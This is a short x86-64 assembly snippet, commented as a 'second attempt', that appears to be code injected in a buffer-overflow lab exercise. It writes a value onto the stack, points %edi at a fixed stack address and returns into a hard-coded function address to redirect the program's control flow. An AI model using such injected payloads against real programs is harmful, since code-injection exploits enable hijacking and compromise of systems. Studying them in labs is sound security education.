# Second attempt: write spec loc of string and push addr into stack
	movl $0x3ad6d060, -48(%rsp)
	movl $0x5566e0a8, %edi
	movl $0x401ba5, (%esp)
	ret
	